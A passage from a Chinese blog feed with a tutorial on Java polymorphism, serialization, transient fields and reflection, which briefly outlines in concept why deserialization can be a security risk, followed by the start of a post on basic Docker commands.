当使用多态方式调用方法时，首先检查父类中是否有该方法，如果没有，则编译错误；如果有，再去调用子类的同名方法。</code></pre><p>多态的好处：可以使程序有良好的扩展，并可以对所有类的对象进行通用处理。</p><pre><code>向上转型的对象调⽤的⽅法是⼦类覆盖或继承⽗类的⽅法，不是⽗类的⽅法向上转型的对象⽆法调⽤⼦类特有的⽅法</code></pre><p>其实向上转型就是多态的一种实现方式，在反序列化中，如果在某一个类中找不到可以实现恶意方法，就可以去他的父类找，或者父类的父类。</p><h4 id="Java-接口和回调"><a href="#Java-接口和回调" class="headerlink" title="Java 接口和回调"></a>Java 接口和回调</h4><p>​    Java的接口（interface）定义了纯抽象规范，一个类可以实现多个接口。</p><ul><li>接口也是数据类型，适用于向上转型和向下转型；</li><li>接口的所有方法都是抽象方法，接口不能定义实例字段；</li><li>接口可以定义default方法（JDK&gt;&#x3D;1.8）。</li><li></li><li><pre><code class="java">package qingchuan.java;//定义一个People接口interface People &#123;    //接口的方法peopleList()    void peopleList();&#125;//Students继承接口class Student implements People &#123;    public void peopleList() &#123;        System.out.println(&quot;I’m a student.&quot;);    &#125;&#125;//Teacher继承接口class Teacher implements People &#123;    public void peopleList() &#123;        System.out.println(&quot;I’m a teacher.&quot;);    &#125;&#125;public class Interface_test &#123;    public static void main(String args[]) &#123;        People a;          //声明接口变量        a = new Student(); //实例化，接口变量中存放对象的引用        a.peopleList();    //接口回调,调用Student类的peopleList()方法        a = new Teacher(); //实例化，接口变量中存放对象的引用        a.peopleList();    //接口回调,调用Teacher类的peopleList()方法    &#125;    // 结果：    // I’m a student.    // I’m a teacher.&#125;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##一、理解Java序列化和反序列化</span><br><span class="line"></span><br><span class="line">Serialization(序列化)：将java对象以一连串的字节保存在磁盘文件中的过程，也可以说是保存java对象状态的过程。序列化可以将数据永久保存在磁盘上(通常保存在文件中)。</span><br><span class="line"></span><br><span class="line">deserialization(反序列化)：将保存在磁盘文件中的java字节码重新转换成java对象称为反序列化。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">###为什么需要序列化与反序列化？？</span><br><span class="line"></span><br><span class="line"> 我们知道，当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。那么当两个Java进程进行通信时，能否实现进程间的对象传送呢？答案是可以的。如何做到呢？这就需要Java序列化与反序列化了。换句话说，一方面，发送方需要把这个Java对象转换为字节序列，然后在网络上传送；另一方面，接收方需要从字节序列中恢复出Java对象。</span><br><span class="line"></span><br><span class="line"> 当我们明晰了为什么需要Java序列化和反序列化后，我们很自然地会想Java序列化的好处。其好处一是实现了数据的持久化，通过序列化可以把数据永久地保存到硬盘上（通常存放在文件里），二是，利用序列化实现远程通信，即在网络上传送对象的字节序列。</span><br><span class="line"></span><br><span class="line">① 想把内存中的对象保存到一个文件中或者数据库中时候；</span><br><span class="line">② 想用套接字在网络上传送对象的时候；</span><br><span class="line">③ 想通过RMI（远程）传输对象的时候</span><br><span class="line"></span><br><span class="line">## 序列化和反序列化的实现</span><br><span class="line"></span><br><span class="line"> 只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列。（不是则会抛出异常） </span><br><span class="line"></span><br><span class="line">我们新建3个类，测试一下序列化和反序列化</span><br><span class="line"></span><br><span class="line">Person类</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">package QIngchaun;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class SerializationTest &#123;</span><br><span class="line">public  static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">    ObjectOutputStream oos =new ObjectOutputStream((new FileOutputStream(&quot;ser.bin&quot;)));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line">public static void main(String[] args)throws Exception&#123;</span><br><span class="line">    Person person = new Person(&quot;aa&quot;,22);</span><br><span class="line">    System.out.println(person);</span><br><span class="line">   serialize(person);</span><br><span class="line">&#125;</span><br><span class="line">&#125;package QIngchaun;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class Person implements Serializable &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">    public Person()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public Person(String name,int age)&#123;</span><br><span class="line">        this.name=name;</span><br><span class="line">        this.age=age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;Person&#123;&quot;+</span><br><span class="line">                &quot;name:&#x27;&quot;+name+&#x27;\&#x27;&#x27;+</span><br><span class="line">                &quot;,age=&quot;+age +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre></li></ul><p>Serialize类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> QIngchaun;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line"><span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>((<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>)));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">    System.out.println(person);</span><br><span class="line">   serialize(person);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Unserialize类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> QIngchaun;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserlialize</span><span class="params">(String Filename)</span><span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span>ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span>(Person)unserlialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对上面的2个操作文件流的类的简单说明</p><p>ObjectOutputStream代表对象输出流：</p><p>它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。</p><p>ObjectInputStream代表对象输入流：</p><p>它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。<br>3. 一个实现 Serializable 接口的子类也是可以被序列化的。</p><ol start="4"><li>静态成员变量是不能被序列化</li></ol><p>序列化是针对对象属性的，而静态成员变量是属于类的。</p><p>transient 标识的对象成员变量不参与序列化</p><p>transient实例：我们在name前加了transient，反序列化的时候结果将显示为空</p><p><img src="/2023/09/22/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image/image-20230922112645214-1700990359045-192-1700994555769-165.png"></p><p><img src="/2023/09/22/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image/image-20230922112902823-1700990359045-191-1700994555769-166.png"></p><p>在下面这个栗子中，MyList 这个类定义了一个 arr 数组属性，初始化的数组长度为 100。在实际序列化时如果让 arr 属性参与序列化的话，那么长度为 100 的数组都会被序列化下来，但是我在数组中可能只存放 30 个数组而已，这明显是不可理的，所以这里就要自定义序列化过程啦，具体的做法是写以下两个 private 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">private void writeObject(java.io.ObjectOutputStream s)throws java.io.IOException</span><br><span class="line">private void readObject(java.io.ObjectInputStream s)throws java.io.IOException, ClassNotFoundExceptionja</span><br></pre></td></tr></table></figure><p>从这两个方法的名字就可以看出分别是序列化写入数据和反序列化读取数据用的，那么这两个方法是在哪里使用呢？其实在序列化和反序列化过程中会通过<code>反射</code>调用的，具体下面会分析这个过程哦。</p><blockquote><p>现在来看看这个 transient 应用:</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyList</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    transient 表示该成员 arr 不需要被序列化</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Object[] arr;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyList</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyList</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.arr = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        给前面30个元素进行初始化</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">this</span>.arr[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MyList&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, arr=&quot;</span> + Arrays.toString(arr) +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//-------------------------- 自定义序列化反序列化 arr 元素 ------------------</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Save the state of the &lt;tt&gt;ArrayList&lt;/tt&gt; instance to a stream (that</span></span><br><span class="line"><span class="comment">     * is, serialize it).</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@serialData</span> The length of the array backing the &lt;tt&gt;ArrayList&lt;/tt&gt;</span></span><br><span class="line"><span class="comment">     * instance is emitted (int), followed by all of its elements</span></span><br><span class="line"><span class="comment">     * (each an &lt;tt&gt;Object&lt;/tt&gt;) in the proper order.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">        <span class="comment">//执行 JVM 默认的序列化操作</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment">//手动序列化 arr  前面30个元素</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            s.writeObject(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Reconstitute the &lt;tt&gt;ArrayList&lt;/tt&gt; instance from a stream (that is,</span></span><br><span class="line"><span class="comment">     * deserialize it).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line"> </span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        arr = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">30</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            arr[i] = s.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransientMain</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILE_PATH</span> <span class="operator">=</span> <span class="string">&quot;./transient.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        serializeMyList();</span><br><span class="line"> </span><br><span class="line">        deserializeMyList();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeMyList</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化...&quot;</span>);</span><br><span class="line">        <span class="type">MyList</span> <span class="variable">myList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyList</span>(<span class="string">&quot;ArrayList&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(FILE_PATH));</span><br><span class="line">        oos.writeObject(myList);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    1.如果 private  Object[] arr; 没有使用 transient ，那么整个数组都会被保存，而不是保存实际存储的数据</span></span><br><span class="line"><span class="comment">    输出结果：MyList&#123;name=&#x27;ArrayList&#x27;, arr=[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null]&#125;</span></span><br><span class="line"><span class="comment">    2.private transient Object[] arr;设置了 transient，表示 arr 元素不进行序列化</span></span><br><span class="line"><span class="comment">    输出结果：MyList&#123;name=&#x27;ArrayList&#x27;, arr=null&#125;</span></span><br><span class="line"><span class="comment">    3.参考 ArrayList 处理内部的 transient Object[] elementData; 数组是通过 writeObject 和 readObject 实现的</span></span><br><span class="line"><span class="comment">    我们的 MyList 内部也可以借鉴这种方式实现transient元素的手动序列化和反序列化。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserializeMyList</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化...&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(FILE_PATH));</span><br><span class="line">        <span class="type">MyList</span> <span class="variable">myList</span> <span class="operator">=</span> (MyList) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        System.out.println(myList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>测试结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">序列化...</span><br><span class="line">writeObject...</span><br><span class="line">反序列化...</span><br><span class="line">readObject...</span><br><span class="line">MyList&#123;name=&#x27;ArrayList&#x27;, arr=[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29]&#125;</span><br></pre></td></tr></table></figure><p>6.Serializable 在序列化和反序列化过程中大量使用了反射，因此其过程会产生的大量的内存碎片</p><p>###为什么会产生安全问题？</p><p>只要服务端反序列化数据，客户端传递类的readObject中代码会被自动执行，给予攻击者在服务器上运行代码的能力</p><p>可能的形式</p><p>1.入口类的readObject直接调用危险方法</p><p>2.入口类参数中包含可控了，该类有危险方法，readObject时被调用</p><p>3.入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用</p><p>比如类定义类型为Object，调用equals&#x2F;hashcode&#x2F;toString</p><p>重点 相同类型，同名函数</p><p>4.构造函数&#x2F;静态代码快等类加载时隐式执行。</p><p>共用条件 继承serialize </p><p>入口类 source（重写readObject 参数类型宽泛 最好jdk自带</p><p>调用链 gadget chain</p><p>执行类 sink （rce ssrf 写文件等等</p><h2 id="反射的理解"><a href="#反射的理解" class="headerlink" title="反射的理解"></a>反射的理解</h2><p>Java的反射机制是值在云翔状态中，对于任意一个类都能够知道这个类所有的属性和方法；这种动态获取信息一节动态调用对象的方法的功能成为java语言的反射机制。</p><h3 id="白话理解"><a href="#白话理解" class="headerlink" title="白话理解"></a>白话理解</h3><p>正射，</p><p>万物有阴必有阳，有正必有反，既然有反射，就必有正射。</p><p>那么正射是什么呢</p><p>当我们写写代码的时候，到需要去用到某一个类的时候，都会先去了解这个类是做什么的，然后实例化这列，接着使用实例化好的对象进行操作，这既是正射</p><p>Student student &#x3D;new Student();</p><p>student.homework(“数学”)；</p><p>反射 </p><p>反射就是一开始你并不知道我们初始化的类的对象是什么，自然也就无法使用new这一类关键字来创建对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Class clazz=Class.foName(&quot;reflection.Student&quot;);</span><br><span class="line"></span><br><span class="line">Method method =clazz.getMethod(&quot;doHomework&quot;,String.class);</span><br><span class="line"></span><br><span class="line">Constructor constructor =clazz.getConstructor();</span><br><span class="line"></span><br><span class="line">Object object =contructor.new.newInstance();</span><br><span class="line"></span><br><span class="line">method.invoke(object,&quot;语文&quot;);</span><br></pre></td></tr></table></figure><p>反射的作用：让java具有动态性，</p><p>就是在代码运行的时候，动态的进行实例化</p><p>可以修改已有对象的属性</p><p>动态生成对象</p><p>动态调用方法</p><p>操作内部类和私有方法</p><p>在反序列化中，定制需要的对象，</p><p>通过invoke调用出了同名函数以外的函数，通过Class了器创建对象，引入不能序列化的类</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker File 的基本操作</title>
      <link href="/2023/09/20/Docker%20file%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2023/09/20/Docker%20file%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker-file-的基本操作"><a href="#Docker-file-的基本操作" class="headerlink" title="Docker file 的基本操作"></a>Docker file 的基本操作</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p><img src="/2023/09/20/Docker%20file%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image/image-20230919184844700-1700990334962-123-1700994526524-97.png"></p><p>出现这种情况就说明正常，</p><h2 id="对Docker操作"><a href="#对Docker操作" class="headerlink" title="对Docker操作"></a>对Docker操作</h2><p>安装完成Docker后,默认每次开机的时候都会自动启动,但我们也可以手动启动,关闭或者重启Docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 启动docker</span><br><span class="line">sudo service docker start</span><br><span class="line"># 重启docker</span><br><span class="line">sudo service docker restart</span><br><span class="line"># 停止docker</span><br><span class="line">sudo service docker stop</span><br></pre></td></tr></table></figure><h2 id="对镜像的基础操作"><a href="#对镜像的基础操作" class="headerlink" title="对镜像的基础操作"></a>对镜像的基础操作</h2><h3 id="获取当时所有镜像-docker-images"><a href="#获取当时所有镜像-docker-images" class="headerlink" title="获取当时所有镜像(docker images)"></a>获取当时所有镜像(docker images)</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">ls</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">docker images</span><br></pre></td></tr></table></figure><table><thead><tr><th>标签</th><th>含义</th></tr></thead><tbody><tr><td>REPOSITORY</td><td>镜像所在的仓库名称</td></tr><tr><td>TAG</td><td>镜像标签</td></tr><tr><td>IMAGEID</td><td>镜像ID</td></tr><tr><td>CREATED</td><td>镜像的创建日期(不是获取该镜像的日期)</td></tr><tr><td>SIZE</td><td>镜像大小</td></tr></tbody></table><h3 id="拉去镜像-docker-pull"><a href="#拉去镜像-docker-pull" class="headerlink" title="拉去镜像(docker pull)"></a>拉去镜像(docker pull)</h3><p>除了使用官方的镜像外,我们还可以在仓库中申请一个自己的账号,保存自己制作的进行,或者拉去使用他人的镜像。</p><h1 id="官方镜像"><a href="#官方镜像" class="headerlink" title="官方镜像"></a>官方镜像</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">docker image pull 镜像名称 </span><br><span class="line"># 或简写为 </span><br><span class="line">docker pull 镜像名称</span><br><span class="line"># 比如</span><br><span class="line">docker pull ubuntu</span><br><span class="line">docker pull ubuntu:16.04</span><br><span class="line"></span><br><span class="line"># 个人镜像</span><br><span class="line">docker pull 仓库名称/镜像名称</span><br><span class="line">docker pull xunmi/django</span><br><span class="line"></span><br><span 